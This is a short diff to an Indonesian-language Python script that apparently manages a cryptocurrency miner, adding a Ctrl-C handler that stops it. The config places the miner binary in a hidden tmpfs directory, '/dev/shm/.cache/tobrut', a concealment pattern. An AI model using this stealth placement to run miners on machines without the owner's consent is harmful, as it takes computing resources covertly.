@@ -1,6 +1,7 @@
 import os
 import time
 import sys
+import signal
 
 # CONFIG
 MINER_PATH = "/dev/shm/.cache/tobrut"  # Lokasi miner
@@ -44,6 +45,13 @@ def main():
 
         print("😴 Istirahat dulu biar fresh...")
         time.sleep(REST_TIME)
+
+def sigint_handler(sig, frame):
+    print("💔 Aku tahu kamu capek, aku matiin mesinnya ya Sayang...")
+    kill_miner()
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, sigint_handler)
 
 if __name__ == "__main__":
     print("💓 Cinta Abadi v9 Jalan Sayangku... 💕")
